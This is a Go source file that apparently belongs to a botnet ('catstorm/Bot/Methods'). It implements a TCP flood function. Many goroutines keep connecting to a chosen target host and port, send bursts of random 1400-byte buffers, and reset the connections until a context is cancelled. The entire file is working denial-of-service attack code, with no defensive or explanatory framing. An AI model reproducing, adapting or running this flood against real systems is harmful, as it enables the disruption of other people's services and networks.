package l4

import (
	"context"
	"net"
	"time"
	"catstorm/Bot/Methods"
)

func Tcpflood(ctx context.Context, target string, port string, sec int) {
	addr := net.JoinHostPort(target, port)
	n := methods.Workers()

	for i := 0; i < n; i++ {
		go func() {
			rng := methods.NewXorShift64()
			var bufs [16][]byte
			for i := range bufs {
				bufs[i] = make([]byte, 1400)
				rng.Fill(bufs[i])
			}
			idx := uint64(0)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				con, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}
				bursts := int(rng.Uint64()%200) + 50
				for j := 0; j < bursts; j++ {
					if _, err := con.Write(bufs[idx%16]); err != nil {
						break
					}
					idx++
				}
				if tcp, ok := con.(*net.TCPConn); ok {
					tcp.SetLinger(0)
				}
				con.Close()
			}
		}()
	}
	<-ctx.Done()
}
